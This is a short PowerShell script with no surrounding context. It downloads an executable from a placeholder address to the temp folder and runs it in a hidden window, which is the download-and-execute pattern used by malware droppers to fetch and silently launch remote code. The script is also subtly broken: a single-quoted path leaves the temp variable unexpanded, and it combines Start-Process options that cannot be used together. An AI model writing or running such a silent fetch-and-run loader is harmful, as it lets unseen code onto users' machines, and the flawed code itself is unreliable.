$url = 'https://example.com/file.exe'
$output = '$env:temp\file.exe'

$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)
Start-Process -FilePath $output -WindowStyle Hidden -NoNewWindow -RedirectStandardOutput "$env:temp\stdout.log" -RedirectStandardError "$env:temp\stderr.log" -RedirectStandardInput "$env:temp\stdin.log"
